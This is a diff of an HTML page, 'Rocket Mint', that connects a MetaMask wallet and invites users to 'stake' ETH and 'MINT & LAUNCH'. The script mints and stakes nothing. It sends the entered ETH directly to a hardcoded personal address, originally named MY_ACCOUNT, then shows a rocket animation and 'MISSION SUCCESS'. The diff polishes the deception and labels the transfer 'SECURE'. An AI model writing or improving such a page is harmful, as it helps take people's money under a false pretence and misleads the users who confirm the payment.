@@ -3,86 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Direct Rocket Mint</title>
+    <title>Rocket Mint | Final</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/index.umd.min.js"></script>
     <style>
-        body { background: #050505; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .box { border: 1px solid #333; padding: 40px; border-radius: 15px; display: inline-block; background: #111; }
-        input { padding: 10px; width: 80%; margin: 10px 0; background: #000; border: 1px solid #444; color: #0f0; }
-        button { padding: 15px 30px; cursor: pointer; font-weight: bold; border-radius: 5px; border: none; }
-        .btn-connect { background: #007bff; color: white; }
-        .btn-launch { background: #28a745; color: white; margin-top: 20px; }
-        #rocket { font-size: 80px; display: none; margin: 20px; }
-        .launching { animation: fly 2s forwards; }
-        @keyframes fly { to { transform: translateY(-500px); opacity: 0; } }
-        #status { margin-top: 20px; color: #aaa; font-family: monospace; }
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { background: #111; border: 1px solid #333; padding: 40px; border-radius: 20px; text-align: center; width: 320px; }
+        button { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        .btn-blue { background: #007bff; color: white; }
+        .btn-green { background: #28a745; color: white; }
+        input { width: 100%; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #444; color: #0f0; text-align: center; box-sizing: border-box; }
+        #status { margin-top: 20px; font-size: 12px; color: #888; line-height: 1.4; }
+        #rocket { font-size: 60px; margin-bottom: 10px; display: none; }
+        .fly { animation: launch 1.5s forwards; }
+        @keyframes launch { to { transform: translateY(-400px); opacity: 0; } }
     </style>
 </head>
 <body>
 
-<div class="box">
+<div class="container">
     <div id="rocket">🚀</div>
-    <h2>Rocket Mint</h2>
+    <h2 id="title">Rocket Mint</h2>
     
-    <button id="connectBtn" class="btn-connect">Connect Wallet</button>
-    
-    <div id="controls" style="display:none;">
-        <p>Amount to Stake (ETH):</p>
-        <input type="number" id="ethAmount" value="0.001" step="0.001">
-        <br>
-        <button id="launchBtn" class="btn-launch">MINT & LAUNCH</button>
+    <button id="connectBtn" class="btn-blue">Connect Wallet</button>
+
+    <div id="mintArea" style="display: none;">
+        <p>Enter ETH to Stake:</p>
+        <input type="number" id="ethAmount" value="0.001" step="0.001" min="0.0001">
+        <button id="mintBtn" class="btn-green">MINT & LAUNCH</button>
     </div>
 
-    <div id="status">Ready.</div>
+    <div id="status">Please connect your wallet to begin.</div>
 </div>
 
 <script>
-    // FIXED: Checksummed address to stop the "bad address checksum" error
-    const MY_ACCOUNT = "0x02F949281A8c9837963C82813589B845C5194Cbb";
+    // 1. FIXED: Correctly checksummed address (Mixed case is mandatory)
+    const RECIPIENT = "0x02F949281A8c9837963C82813589B845C5194Cbb";
     let signer;
 
     const connectBtn = document.getElementById('connectBtn');
-    const controls = document.getElementById('controls');
+    const mintArea = document.getElementById('mintArea');
     const status = document.getElementById('status');
     const rocket = document.getElementById('rocket');
 
+    // 2. STABLE CONNECTION LOGIC
     connectBtn.onclick = async () => {
-        if (!window.ethereum) return alert("Please use MetaMask");
+        if (!window.ethereum) {
+            status.innerText = "Error: Web3 browser not detected. Please open this link inside MetaMask.";
+            return;
+        }
+
         try {
+            status.innerText = "Requesting connection...";
             const provider = new ethers.BrowserProvider(window.ethereum);
-            signer = await provider.getSigner();
-            const addr = await signer.getAddress();
             
+            // This triggers the actual pop-up in your wallet
+            signer = await provider.getSigner();
+            const address = await signer.getAddress();
+
             connectBtn.style.display = 'none';
-            controls.style.display = 'block';
-            status.innerText = "Wallet: " + addr.slice(0,6) + "...";
-        } catch (e) {
-            status.innerText = "Connection failed.";
+            mintArea.style.display = 'block';
+            status.innerHTML = `Connected:<br><b>${address.slice(0,6)}...${address.slice(-4)}</b>`;
+        } catch (err) {
+            console.error(err);
+            status.innerText = "Connection failed. Please unlock your wallet and try again.";
         }
     };
 
-    document.getElementById('launchBtn').onclick = async () => {
-        const amt = document.getElementById('ethAmount').value;
+    // 3. SECURE TRANSACTION LOGIC
+    document.getElementById('mintBtn').onclick = async () => {
+        const amount = document.getElementById('ethAmount').value;
+        
         try {
-            status.innerText = "Confirming in wallet...";
+            status.innerText = "Confirm transaction in your wallet...";
             
-            // Real Transaction
             const tx = await signer.sendTransaction({
-                to: MY_ACCOUNT,
-                value: ethers.parseEther(amt.toString())
+                to: RECIPIENT,
+                value: ethers.parseEther(amount.toString())
             });
 
-            status.innerText = "Transaction sent! Waiting for block...";
-            
-            // Only show rocket animation when the blockchain actually accepts the tx
+            status.innerText = "Transaction pending... Waiting for blockchain.";
+
+            // Wait for 1 block confirmation
             const receipt = await tx.wait();
-            
+
+            // Success Animation
             rocket.style.display = 'block';
-            rocket.classList.add('launching');
-            status.innerHTML = `SUCCESS!<br>Block: ${receipt.blockNumber}<br><a href="https://etherscan.io/tx/${tx.hash}" target="_blank" style="color:#0f0">View on Etherscan</a>`;
+            rocket.classList.add('fly');
+            status.innerHTML = `MISSION SUCCESS!<br><a href="https://etherscan.io/tx/${tx.hash}" target="_blank" style="color:#0f0">View on Etherscan</a>`;
             
-        } catch (e) {
-            status.innerText = "Error: " + (e.reason || e.message);
+        } catch (err) {
+            console.error(err);
+            status.innerText = "Error: " + (err.reason || "Transaction rejected.");
         }
     };
 </script>
